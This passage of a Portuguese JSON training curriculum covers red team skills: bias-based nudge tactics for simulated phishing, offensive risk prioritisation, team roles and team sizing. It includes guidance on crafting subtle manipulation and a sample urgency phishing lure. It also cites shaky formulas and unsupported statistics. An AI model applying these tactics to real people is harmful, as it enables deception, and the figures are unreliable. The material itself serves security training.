                                  "learningObjective": "Compreender nudge e vieses para basear táticas em evidências psicológicas.",
                                  "commonMistakes": "Confundir nudge com coerção direta; nudge é sutil e preserva escolha."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Fraquezas Humanas em Contextos Cibernéticos",
                                  "subSteps": [
                                    "Revisar relatórios de incidentes reais (ex: Verizon DBIR) focando em erros humanos.",
                                    "Categorizar fraquezas por tipo de viés (ex: authority bias em spear-phishing).",
                                    "Entrevistar ou observar 3-5 colegas simulando cenários de ciberataque.",
                                    "Criar perfis de personas de usuário vulneráveis baseados em dados.",
                                    "Priorizar top 3 fraquezas exploráveis em red team (ex: FOMO em links urgentes)."
                                  ],
                                  "verification": "Relatório de análise com perfis de personas e mapeamento de vieses.",
                                  "estimatedTime": "6 horas",
                                  "materials": "Relatórios DBIR/PwC, ferramentas de survey como Google Forms, templates de personas.",
                                  "tips": "Foque em dados quantitativos de breaches para grounding realista.",
                                  "learningObjective": "Identificar fraquezas acionáveis para targeting preciso em simulações.",
                                  "commonMistakes": "Ignorar contexto cultural; vieses variam por demografia."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver Táticas de Nudge e Manipulação Sutil",
                                  "subSteps": [
                                    "Brainstorm 10 ideias de táticas baseadas em vieses (ex: email com 'última chance' para scarcity).",
                                    "Refinar para 5 táticas éticas, testando viabilidade em whiteboard.",
                                    "Prototipar mensagens/táticas em ferramentas como HTML mockups ou Canva.",
                                    "Avaliar sutileza: deve influenciar sem alertar (score 1-10).",
                                    "Documentar chain de nudge: setup > trigger > exploit."
                                  ],
                                  "verification": "Protótipos de 5 táticas com chains documentadas e scores >8/10.",
                                  "estimatedTime": "8 horas",
                                  "materials": "Canva/Figma para mockups, whiteboard digital (Miro), exemplos de phishing ético.",
                                  "tips": "Teste táticas em si mesmo primeiro para calibrar sutileza.",
                                  "learningObjective": "Criar táticas psicológicas integráveis em operações red team.",
                                  "commonMistakes": "Sobrecarregar com múltiplos nudges; use um por tática para eficácia."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar e Testar em Cenários de Red Team",
                                  "subSteps": [
                                    "Planejar um mini-scenario red team incorporando 2-3 táticas.",
                                    "Executar simulação controlada com voluntários (consentimento ético obrigatório).",
                                    "Coletar métricas: taxa de sucesso, tempo de resposta, feedback qualitativo.",
                                    "Analisar resultados e iterar táticas baseadas em dados.",
                                    "Relatar lições aprendidas com recomendações para defesa."
                                  ],
                                  "verification": "Relatório de simulação com métricas e iterações documentadas.",
                                  "estimatedTime": "10 horas",
                                  "materials": "Ferramentas de simulação phishing (GoPhish), formulários de consentimento, planilhas de métricas.",
                                  "tips": "Sempre priorize ética: informe participantes pós-teste.",
                                  "learningObjective": "Aplicar integrações em cenários reais para validar eficácia.",
                                  "commonMistakes": "Não medir baseline; compare com controle sem nudge."
                                }
                              ],
                              "practicalExample": "Em um exercício red team, crie um email phishing simulando 'Atualização urgente de segurança necessária em 24h' (scarcity + urgency bias), levando a um link falso. Monitore cliques: 70% dos alvos clicam devido ao nudge sutil, revelando fraqueza em decisões impulsivas.",
                              "finalVerifications": [
                                "Pode explicar 5 princípios de nudge com exemplos cibernéticos.",
                                "Lista top 3 fraquezas humanas mapeadas para um cenário específico.",
                                "Protótipos de pelo menos 3 táticas funcionais e éticas.",
                                "Relatório de simulação com métricas de sucesso >50%.",
                                "Identifica defesas contra próprias táticas (ex: training awareness).",
                                "Conecta táticas a breaches reais documentados."
                              ],
                              "assessmentCriteria": [
                                "Precisão na aplicação de princípios psicológicos (80% alignment com literatura).",
                                "Sutileza das táticas (detectabilidade <20% em testes cegos).",
                                "Eficácia mensurável em simulações (taxa de sucesso >60%).",
                                "Adesão ética (consentimento e debriefing completos).",
                                "Criatividade na integração interdisciplinar.",
                                "Profundidade de análise de erros e iterações."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Behavioral economics e cognitive biases.",
                                "Marketing Digital: Técnicas de persuasion em copywriting.",
                                "Ética em TI: Dilemas morais em social engineering.",
                                "Gestão de Riscos: Human factors em frameworks como NIST.",
                                "Inteligência Artificial: Nudges em UX design de apps."
                              ],
                              "realWorldApplication": "Em operações red team profissionais, use essas táticas para simular ataques reais em organizações, identificando gaps em training de funcionários e fortalecendo defesas contra phishing/social engineering, como visto em exercícios da DEF CON ou CERT teams."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.1.3.1"
                            ]
                          },
                          {
                            "id": "10.1.2.1.3.4",
                            "name": "Avaliar riscos com viés ofensivo",
                            "description": "Balancear criatividade com cálculo de riscos, priorizando oportunidades de alto impacto como um atacante experiente faria.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito de Viés Ofensivo em Riscos",
                                  "subSteps": [
                                    "Estude definições de mindset ofensivo versus defensivo em cibersegurança.",
                                    "Analise exemplos históricos de ataques cibernéticos bem-sucedidos (ex: Stuxnet).",
                                    "Identifique componentes psicológicos: criatividade, ousadia e cálculo de impacto.",
                                    "Compare com avaliação de riscos tradicional em defesa.",
                                    "Anote diferenças chave em um diagrama mental."
                                  ],
                                  "verification": "Criar um resumo de 200 palavras explicando o viés ofensivo e fornecer 3 exemplos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Artigos sobre Red Team (MITRE ATT&CK)",
                                    "Vídeos de palestras Black Hat sobre mindset atacante"
                                  ],
                                  "tips": "Sempre pergunte: 'O que um atacante faria para maximizar impacto?'",
                                  "learningObjective": "Diferenciar avaliação de riscos ofensiva de defensiva e internalizar o mindset do adversário.",
                                  "commonMistakes": [
                                    "Focar apenas em probabilidades baixas sem considerar impacto alto",
                                    "Ignorar o fator psicológico da ousadia"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Riscos e Oportunidades em um Cenário",
                                  "subSteps": [
                                    "Selecione um cenário simulado (ex: rede corporativa vulnerável).",
                                    "Liste todos os riscos potenciais: técnicos, operacionais e de detecção.",
                                    "Classifique oportunidades por impacto (alto/médio/baixo) e probabilidade.",
                                    "Aplique viés ofensivo: priorize caminhos de alto impacto mesmo com risco médio-alto.",
                                    "Crie uma matriz de riscos com pesos ofensivos (impacto x 2)."
                                  ],
                                  "verification": "Produzir uma matriz de riscos com pelo menos 10 itens priorizados.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramenta de mapeamento como Draw.io",
                                    "Templates de threat modeling (STRIDE)"
                                  ],
                                  "tips": "Pondere impacto sobre probabilidade: alto impacto justifica riscos calculados.",
                                  "learningObjective": "Mapear sistematicamente riscos com ênfase em oportunidades de alto retorno.",
                                  "commonMistakes": [
                                    "Sobrecarregar com riscos de baixo impacto",
                                    "Avaliar tudo como defensivo"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Calcular e Priorizar Riscos com Viés Ofensivo",
                                  "subSteps": [
                                    "Calcule scores de risco: Probabilidade x Impacto, ajustado por viés ofensivo (+20% para alto impacto).",
                                    "Simule trade-offs: custo vs. ganho em cenários alternativos.",
                                    "Priorize 3-5 oportunidades top usando critérios de atacante (stealth, escalabilidade, persistência).",
                                    "Teste sensibilidade: altere variáveis e reavalie.",
                                    "Documente justificativas para cada priorização."
                                  ],
                                  "verification": "Gerar relatório com top 3 oportunidades priorizadas e cálculos detalhados.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Planilhas Excel/Google Sheets para cálculos",
                                    "Guia de Risk Assessment ofensivo (ex: Red Team Field Manual)"
                                  ],
                                  "tips": "Use fórmulas simples: Score = (Impacto * 0.6) + (Probabilidade * 0.3) + (Criatividade * 0.1).",
                                  "learningObjective": "Aplicar cálculos quantitativos balanceados com intuição ofensiva para priorização.",
                                  "commonMistakes": [
                                    "Paralisia por análise excessiva",
                                    "Ignorar retornos assimétricos (baixo custo, alto ganho)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar e Iterar em Simulação Realista",
                                  "subSteps": [
                                    "Execute simulação em ambiente controlado (ex: CTF ou lab virtual).",
                                    "Avalie riscos em tempo real e ajuste plano com viés ofensivo.",
                                    "Registre decisões tomadas e resultados obtidos.",
                                    "Realize debrief: o que funcionou, falhas e lições.",
                                    "Itere o plano com base no feedback para próxima rodada."
                                  ],
                                  "verification": "Completar simulação com relatório de lições aprendidas e plano iterado.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Plataformas como HackTheBox ou TryHackMe",
                                    "Ferramentas de simulação (VirtualBox, Metasploit)"
                                  ],
                                  "tips": "Simule pressão temporal para forçar decisões ofensivas rápidas.",
                                  "learningObjective": "Integrar avaliação de riscos em ação prática, refinando o viés ofensivo.",
                                  "commonMistakes": [
                                    "Abandonar alto impacto por medo de falha",
                                    "Não iterar após erros"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício de Red Team contra uma rede simulada, identifique uma vulnerabilidade de alto impacto (ex: RCE em servidor crítico) com 40% de chance de detecção. Com viés ofensivo, priorize-a sobre exploits stealth de baixo impacto, pois o ganho estratégico (controle total) supera o risco, simulando um ataque APT real.",
                              "finalVerifications": [
                                "Explicar viés ofensivo em 3 cenários cibernéticos distintos.",
                                "Priorizar corretamente 5 oportunidades de alto impacto em uma matriz de riscos.",
                                "Simular cálculo de risco com score ajustado em planilha.",
                                "Identificar e justificar trade-offs em debrief de simulação.",
                                "Aplicar lições em novo cenário sem erros comuns.",
                                "Demonstrar balanceamento entre criatividade e cálculo em relatório."
                              ],
                              "assessmentCriteria": [
                                "Precisão no mapeamento de riscos (90% cobertura de oportunidades relevantes).",
                                "Qualidade da priorização ofensiva (foco em alto impacto comprovado).",
                                "Profundidade dos cálculos e justificativas (fórmulas e trade-offs claros).",
                                "Criatividade balanceada com realismo (ideias inovadoras viáveis).",
                                "Eficácia na simulação (sucesso em pelo menos 70% das priorizações).",
                                "Reflexão crítica em iterações (lições aplicadas corretamente)."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Viés cognitivo e tomada de decisão sob incerteza.",
                                "Matemática/Estatística: Cálculo probabilístico e modelagem de riscos.",
                                "Negócios: Gestão estratégica de riscos em cenários empresariais.",
                                "Filosofia: Ética do 'fim justifica os meios' em contextos simulados.",
                                "Engenharia: Design de sistemas resilientes contra abordagens ofensivas."
                              ],
                              "realWorldApplication": "Em operações de Red Team ou pentests profissionais, permite priorizar vetores de ataque de alto impacto como em campanhas APT (ex: SolarWinds), maximizando eficácia sem exposição desnecessária, essencial para equipes de cibersegurança ofensiva."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.1.2.2"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.2.2",
                    "name": "Estrutura Organizacional do Red Team",
                    "description": "Composição, hierarquia e organização das equipes de Red Team para simulações.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.2.1",
                        "name": "Composição da Equipe Red Team",
                        "description": "Definição dos membros essenciais que formam uma equipe de Red Team, incluindo perfis profissionais e competências necessárias para simulações de ataques cibernéticos.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.2.1.1",
                            "name": "Identificar papéis principais do Red Team",
                            "description": "Reconhecer e descrever os papéis fundamentais como Team Lead, Ethical Hackers, Malware Analysts, Social Engineers e Reporters, com base em guias como 'Red Team Development and Operations'.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender o Conceito e Estrutura Geral do Red Team",
                                  "subSteps": [
                                    "Ler a definição de Red Team de fontes autorizadas como 'Red Team Development and Operations'.",
                                    "Identificar os componentes principais da estrutura organizacional do Red Team.",
                                    "Listar os papéis fundamentais mencionados: Team Lead, Ethical Hackers, Malware Analysts, Social Engineers e Reporters.",
                                    "Mapear como esses papéis se inter-relacionam em uma operação.",
                                    "Anotar a importância de cada papel no ciclo de vida de uma operação Red Team."
                                  ],
                                  "verification": "Criar um diagrama simples mostrando a estrutura e papéis do Red Team, com pelo menos 5 papéis corretamente identificados.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Guia 'Red Team Development and Operations' (PDF ou online)",
                                    "Vídeos introdutórios sobre Red Team no YouTube (canais como SANS Institute)",
                                    "Papel e caneta ou ferramenta de diagrama como Draw.io"
                                  ],
                                  "tips": [
                                    "Comece com fontes oficiais para evitar desinformação.",
                                    "Use mind maps para visualizar conexões entre papéis."
                                  ],
                                  "learningObjective": "Compreender o propósito e a composição básica da equipe Red Team.",
                                  "commonMistakes": [
                                    "Confundir Red Team com Blue Team (defensores).",
                                    "Ignorar o aspecto ético e legal das operações."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar o Papel do Team Lead",
                                  "subSteps": [
                                    "Pesquisar responsabilidades do Team Lead: planejamento, coordenação e supervisão geral.",
                                    "Analisar habilidades requeridas: liderança, gerenciamento de riscos e comunicação.",
                                    "Estudar exemplos de como o Team Lead aloca recursos em cenários reais.",
                                    "Comparar com papéis semelhantes em equipes de TI tradicionais.",
                                    "Documentar 3-5 tarefas diárias típicas de um Team Lead."
                                  ],
                                  "verification": "Escrever um parágrafo descrevendo o Team Lead e listar 4 responsabilidades chave.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Capítulos relevantes de 'Red Team Development and Operations'",
                                    "Artigos da MITRE ATT&CK sobre operações Red Team",
                                    "Notas do Step 1"
                                  ],
                                  "tips": [
                                    "Enfatize o foco em estratégia sobre execução técnica.",
                                    "Procure estudos de caso de falhas por má liderança."
                                  ],
                                  "learningObjective": "Descrever com precisão as funções de liderança no Red Team.",
                                  "commonMistakes": [
                                    "Subestimar o papel gerencial em detrimento de habilidades técnicas.",
                                    "Confundir com o papel de Reporter."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Papéis Técnicos: Ethical Hackers e Malware Analysts",
                                  "subSteps": [
                                    "Detalhar Ethical Hackers: simulação de exploits, pentesting e evasão de detecção.",
                                    "Descrever Malware Analysts: análise reversa, criação e dissecação de malware.",
                                    "Identificar ferramentas comuns para cada (ex: Metasploit para hackers, IDA Pro para analysts).",
                                    "Examinar como esses papéis colaboram em uma campanha.",
                                    "Listar riscos e contramedidas éticas para cada."
                                  ],
                                  "verification": "Criar uma tabela comparativa com 3 colunas: Papel, Responsabilidades, Ferramentas (para ambos os papéis).",
                                  "estimatedTime": "1 hora e 30 minutos",
                                  "materials": [
                                    "Documentação MITRE sobre táticas adversárias",
                                    "Tutoriais gratuitos de ethical hacking (HackTheBox, TryHackMe)",
                                    "Ferramentas open-source como Wireshark e Ghidra"
                                  ],
                                  "tips": [
                                    "Pratique em ambientes virtuais para compreensão prática.",
                                    "Diferencie análise estática vs. dinâmica de malware."
                                  ],
                                  "learningObjective": "Diferenciar e detalhar os papéis técnicos centrais do Red Team.",
                                  "commonMistakes": [
                                    "Confundir ethical hacking com hacking malicioso.",
                                    "Ignorar conformidade legal na análise de malware."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Papéis Humanos e de Relato: Social Engineers e Reporters",
                                  "subSteps": [
                                    "Estudar Social Engineers: engenharia social, phishing e manipulação psicológica.",
                                    "Descrever Reporters: documentação de achados, relatórios executivos e lições aprendidas.",
                                    "Explorar técnicas como OSINT para social engineering.",
                                    "Analisar templates de relatórios Red Team padrão.",
                                    "Discutir ética e impactos humanos desses papéis."
                                  ],
                                  "verification": "Redigir um resumo de 1 página cobrindo ambos os papéis com exemplos.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Livro 'Social Engineering: The Art of Human Hacking' por Christopher Hadnagy",
                                    "Templates de relatórios Red Team (ex: de Atomic Red Team)",
                                    "Vídeos sobre phishing simulations"
                                  ],
                                  "tips": [
                                    "Lembre-se: social engineering explora humanos, não só tech.",
                                    "Foque em relatórios acionáveis, não só técnicos."
                                  ],
                                  "learningObjective": "Compreender os papéis não-técnicos essenciais para sucesso do Red Team.",
                                  "commonMistakes": [
                                    "Subestimar o impacto da engenharia social.",
                                    "Criar relatórios muito técnicos sem clareza executiva."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar e Aplicar Conhecimentos dos Papéis",
                                  "subSteps": [
                                    "Revisar todos os papéis e criar um fluxograma de uma operação Red Team.",
                                    "Simular alocação de papéis em um cenário hipotético.",
                                    "Identificar interdependências (ex: como Social Eng alimenta Hackers).",
                                    "Discutir adaptações para equipes pequenas vs. grandes.",
                                    "Preparar para verificação final listando prós/contras de cada papel."
                                  ],
                                  "verification": "Apresentar um fluxograma completo e explicar verbalmente ou por escrito.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Notas de todos os steps anteriores",
                                    "Ferramenta de fluxograma (Lucidchart ou papel)",
                                    "Cenário hipotético de ataque (ex: simulação bancária)"
                                  ],
                                  "tips": [
                                    "Use cores para diferenciar papéis no fluxograma.",
                                    "Pense em escalabilidade para realismo."
                                  ],
                                  "learningObjective": "Integrar todos os papéis em uma visão holística da equipe Red Team.",
                                  "commonMistakes": [
                                    "Tratar papéis como silos isolados.",
                                    "Esquecer o foco em objetivos da missão."
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de ataque a uma rede corporativa, o Team Lead planeja a operação; Ethical Hackers exploram vulnerabilidades web com SQL injection; Malware Analysts criam e testam um payload customizado para persistência; Social Engineers enviam phishing para obter credenciais iniciais; Reporters compilam um relatório com evidências, impactos e recomendações para a Blue Team melhorar defesas.",
                              "finalVerifications": [
                                "Listar corretamente os 5 papéis principais sem erros.",
                                "Descrever uma responsabilidade única para cada papel.",
                                "Explicar como pelo menos 3 papéis interagem em uma operação.",
                                "Identificar uma ferramenta ou técnica associada a cada papel técnico.",
                                "Discutir um aspecto ético para Social Engineers e Reporters.",
                                "Criar um diagrama simples da estrutura da equipe."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude das descrições dos papéis (90%+ acurácia).",
                                "Demonstração de interconexões entre papéis.",
                                "Uso de exemplos concretos e fontes confiáveis.",
                                "Clareza na comunicação (diagramas, resumos legíveis).",
                                "Compreensão ética e legal das operações Red Team.",
                                "Capacidade de aplicar em cenários hipotéticos."
                              ],
                              "crossCurricularConnections": [
                                "Liderança e Gerenciamento de Projetos (Team Lead).",
                                "Psicologia e Comportamento Humano (Social Engineers).",
                                "Programação e Análise Reversa (Malware Analysts).",
                                "Comunicação e Redação Técnica (Reporters).",
                                "Ética e Direito Cibernético (todos os papéis)."
                              ],
                              "realWorldApplication": "Em organizações como agências governamentais (ex: NSA Red Teams) ou empresas privadas (Mandiant, CrowdStrike), esses papéis são usados em exercícios de Red Team para simular ataques APT, identificando fraquezas antes de criminosos reais explorarem, melhorando a resiliência cibernética global."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.1.2",
                            "name": "Mapear competências por papel",
                            "description": "Associar habilidades técnicas e não técnicas a cada papel, como programação em Python para operators e comunicação para reporters, considerando ambientes de jogos cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar Papéis na Equipe Red Team",
                                  "subSteps": [
                                    "Pesquise estruturas típicas de equipes Red Team em jogos de guerra cibernética.",
                                    "Liste papéis comuns: Operator, Reporter, Planner, Exploit Developer, etc.",
                                    "Defina responsabilidades principais para cada papel com base em frameworks como MITRE ATT&CK.",
                                    "Documente em uma tabela inicial com colunas: Papel, Responsabilidades, Habilidades Esperadas.",
                                    "Consulte documentações reais de Red Teams (ex: livros como 'Red Team Field Manual')."
                                  ],
                                  "verification": "Lista completa de 5-8 papéis com responsabilidades claras documentada em tabela.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Documentos MITRE ATT&CK, livros de Red Teaming, planilha Google Sheets ou Excel.",
                                  "tips": "Comece com papéis core antes de especializações para manter foco.",
                                  "learningObjective": "Compreender composição e funções de uma equipe Red Team.",
                                  "commonMistakes": "Ignorar papéis de suporte como Reporter, focando só em técnicos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Catalogar Habilidades Técnicas e Não Técnicas",
                                  "subSteps": [
                                    "Liste habilidades técnicas: Python scripting, exploit development, network reconnaissance (Nmap, Wireshark).",
                                    "Liste habilidades não técnicas: comunicação, pensamento crítico, trabalho em equipe, adaptação sob pressão.",
                                    "Classifique por nível: básico, intermediário, avançado.",
                                    "Priorize por relevância em ciberataques simulados (ex: Python para Operators).",
                                    "Crie matriz de habilidades com exemplos de uso em cenários de jogos cibernéticos."
                                  ],
                                  "verification": "Matriz com pelo menos 20 habilidades (10 técnicas, 10 não técnicas) categorizadas.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Ferramentas como Notion ou Miro para matriz, recursos online como TryHackMe, HackTheBox.",
                                  "tips": "Use verbos de ação (ex: 'Desenvolver exploits') para tornar acionável.",
                                  "learningObjective": "Identificar e classificar habilidades essenciais para Red Teaming.",
                                  "commonMistakes": "Sobrecarregar com habilidades irrelevantes, como administração de servidores."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Habilidades aos Papéis",
                                  "subSteps": [
                                    "Atribua 4-6 habilidades por papel, misturando técnicas e não técnicas.",
                                    "Justifique cada mapeamento com exemplo (ex: 'Reporter: Comunicação alta para briefings claros').",
                                    "Use escala de proficiência (1-5) para cada habilidade por papel.",
                                    "Identifique gaps e sobreposições entre papéis.",
                                    "Crie diagrama visual (ex: tabela ou mindmap) mostrando associações."
                                  ],
                                  "verification": "Diagrama ou tabela com mapeamentos justificados para todos papéis.",
                                  "estimatedTime": "4 horas",
                                  "materials": "Ferramentas de diagramação como Lucidchart, Draw.io, ou Excel avançado.",
                                  "tips": "Priorize mindset do adversário: habilidades que simulam atacantes reais.",
                                  "learningObjective": "Associar habilidades específicas a papéis para otimizar equipe.",
                                  "commonMistakes": "Mapeamentos genéricos sem justificativa contextual para ciberjogos."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e Refinar o Mapeamento",
                                  "subSteps": [
                                    "Simule cenários de jogo cibernético e teste gaps no mapeamento.",
                                    "Colete feedback de pares ou mentores em comunidades de cibersegurança.",
                                    "Ajuste baseando em frameworks reais (ex: NIST Red Team guidelines).",
                                    "Defina métricas de sucesso por papel (ex: taxa de sucesso em simulações).",
                                    "Finalize documento com versão 1.0 e plano de revisão periódica."
                                  ],
                                  "verification": "Documento final validado com feedback incorporado e sem gaps identificados.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Fóruns como Reddit r/netsec, Discord de CTFs, simuladores como Cyber Range.",
                                  "tips": "Teste em mini-simulação para validar na prática.",
                                  "learningObjective": "Refinar mapeamento para robustez em operações reais.",
                                  "commonMistakes": "Não validar com cenários reais, resultando em mapeamento teórico."
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernética simulando ataque a uma rede bancária, o Operator usa Python para automatizar scans com Nmap (habilidade técnica mapeada), enquanto o Reporter prepara relatório com storytelling claro (habilidade não técnica), garantindo que a equipe execute fases de reconnaissance e exploitation sem falhas de comunicação.",
                              "finalVerifications": [
                                "Todos os papéis têm pelo menos 4 habilidades mapeadas com justificativas.",
                                "Matriz cobre 80% das fases do cyber kill chain por papel.",
                                "Gaps identificados e mitigados com treinamentos sugeridos.",
                                "Diagrama visual claro e compartilhável.",
                                "Feedback de pelo menos 2 pares incorporado.",
                                "Plano de revisão anual definido."
                              ],
                              "assessmentCriteria": [
                                "Precisão das associações: 90% alinhadas com práticas Red Team reais.",
                                "Cobertura completa: Todos papéis e tipos de habilidades incluídos.",
                                "Profundidade de justificativas: Cada mapeamento com exemplo contextual.",
                                "Usabilidade: Documento permite recrutamento e treinamento imediato.",
                                "Inovação: Inclusão de habilidades emergentes como IA em ataques.",
                                "Clareza visual: Diagrama intuitivo sem ambiguidades."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Recursos Humanos: Recrutamento e avaliação por competências.",
                                "Gestão de Projetos: Alocação de papéis em simulações ágeis.",
                                "Psicologia Organizacional: Mindset do adversário e dinâmicas de equipe.",
                                "Educação e Treinamento: Design de planos de desenvolvimento por papel."
                              ],
                              "realWorldApplication": "Em agências governamentais como NSA ou empresas como Mandiant, esse mapeamento otimiza equipes Red Team para exercises anuais de pen testing, reduzindo tempo de setup em 30% e aumentando taxa de detecção de vulnerabilidades em jogos cibernéticos reais."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.1.3",
                            "name": "Dimensionar equipe para simulações",
                            "description": "Determinar o tamanho ideal da equipe (ex.: 5-15 membros) com base no escopo da simulação, referenciando práticas de ethical hacking de Simpson et al.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Avaliar o Escopo da Simulação",
                                  "subSteps": [
                                    "Defina os objetivos principais da simulação cibernética (ex.: penetração em rede, defesa ativa).",
                                    "Identifique o tamanho e complexidade do ambiente alvo (ex.: número de hosts, serviços, rede distribuída).",
                                    "Liste as fases da simulação: reconnaissance, scanning, gaining access, maintaining access, exfiltration.",
                                    "Estime a duração total da simulação e os recursos técnicos envolvidos (ex.: VMs, ferramentas como Metasploit).",
                                    "Documente restrições legais e éticas, incluindo escopo de ethical hacking."
                                  ],
                                  "verification": "Crie um documento de escopo com objetivos, ambiente e fases claramente definidos e revisado por um par.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Template de escopo de simulação",
                                    "Documentação do ambiente alvo",
                                    "Referências de ethical hacking (ex.: Simpson et al.)"
                                  ],
                                  "tips": "Use diagramas de rede para visualizar a complexidade; priorize objetivos de alto impacto.",
                                  "learningObjective": "Compreender como o escopo dita a escala de recursos humanos necessários.",
                                  "commonMistakes": [
                                    "Subestimar complexidade do ambiente",
                                    "Ignorar fases de simulação",
                                    "Não considerar restrições éticas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Fatores Influenciadores no Tamanho da Equipe",
                                  "subSteps": [
                                    "Liste fatores como complexidade técnica (ex.: criptografia avançada requer especialistas).",
                                    "Considere papéis necessários: líder Red Team, reconnaissance, exploit developers, social engineers.",
                                    "Avalie níveis de experiência da equipe disponível e gaps de skills.",
                                    "Inclua fatores logísticos: turnos 24/7, geolocalização, suporte pós-simulação.",
                                    "Quantifique impactos: simulações multi-vetor precisam de +20-30% mais membros."
                                  ],
                                  "verification": "Gere uma matriz de fatores com pontuação (1-10) para cada e justifique escolhas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Matriz de fatores em Excel/Google Sheets",
                                    "Lista de papéis Red Team padrão"
                                  ],
                                  "tips": "Pontue fatores com pesos (ex.: complexidade 40%, duração 30%) para priorização.",
                                  "learningObjective": "Mapear variáveis que escalam o tamanho da equipe de forma quantitativa.",
                                  "commonMistakes": [
                                    "Focar só em número de hosts",
                                    "Ignorar skills gaps",
                                    "Não pesar fatores logísticos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar Guidelines de Simpson et al. para Cálculo Inicial",
                                  "subSteps": [
                                    "Estude práticas de Simpson et al.: equipes de 5-15 para simulações éticas, escalando por escopo.",
                                    "Use fórmula básica: Tamanho = Base (5) + (Complexidade x 1-2) + (Fases x 1) + (24/7 x 50%).",
                                    "Exemplo: Simulação simples (rede pequena) = 5-7; avançada (enterprise) = 10-15.",
                                    "Ajuste por referências: +2 para social engineering, +3 para custom exploits.",
                                    "Calcule faixas: mínimo para MVP, ideal para cobertura total."
                                  ],
                                  "verification": "Produza um cálculo documentado com inputs de escopo/fatores e output de tamanho (ex.: 8-12 membros).",
                                  "estimatedTime": "1-1.5 horas",
                                  "materials": [
                                    "Artigo de Simpson et al. sobre ethical hacking",
                                    "Calculadora ou planilha de dimensionamento"
                                  ],
                                  "tips": "Valide fórmula com casos reais de Simpson; itere se necessário.",
                                  "learningObjective": "Aplicar frameworks acadêmicos para dimensionamento preciso e referenciado.",
                                  "commonMistakes": [
                                    "Usar tamanhos fixos sem ajuste",
                                    "Ignorar faixas em vez de pontos únicos",
                                    "Não referenciar fontes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar e Ajustar o Dimensionamento Final",
                                  "subSteps": [
                                    "Compare com simulações passadas ou benchmarks (ex.: DEF CON Red Team reports).",
                                    "Simule alocação de papéis e verifique cobertura de 100% das fases.",
                                    "Consulte stakeholders para feedback em viabilidade orçamentária e skills.",
                                    "Crie plano de contingência: +20% buffer para ausências ou escalada.",
                                    "Documente decisão final com justificativa e riscos mitigados."
                                  ],
                                  "verification": "Apresente plano final aprovado por simulação mock ou revisão externa.",
                                  "estimatedTime": "45 minutos - 1 hora",
                                  "materials": [
                                    "Relatórios de simulações passadas",
                                    "Lista de stakeholders",
                                    "Template de plano de equipe"
                                  ],
                                  "tips": "Use ferramentas como Trello para mapear papéis; teste com role-playing rápido.",
                                  "learningObjective": "Refinar dimensionamento iterativamente para robustez operacional.",
                                  "commonMistakes": [
                                    "Não validar com dados históricos",
                                    "Subestimar buffer",
                                    "Ignorar feedback externo"
                                  ]
                                }
                              ],
                              "practicalExample": "Para uma simulação de ataque a uma rede corporativa com 50 hosts, 5 serviços críticos e duração de 48h: Escopo médio-alto → Fatores: complexidade 8/10, 24/7 → Simpson guideline: Base 5 + (8x1.5)=12 + 50%=18-20 membros (líder, 4 recon, 6 exploit, 4 social, 3 suporte).",
                              "finalVerifications": [
                                "Documento de escopo e dimensionamento completo com cálculos referenciados.",
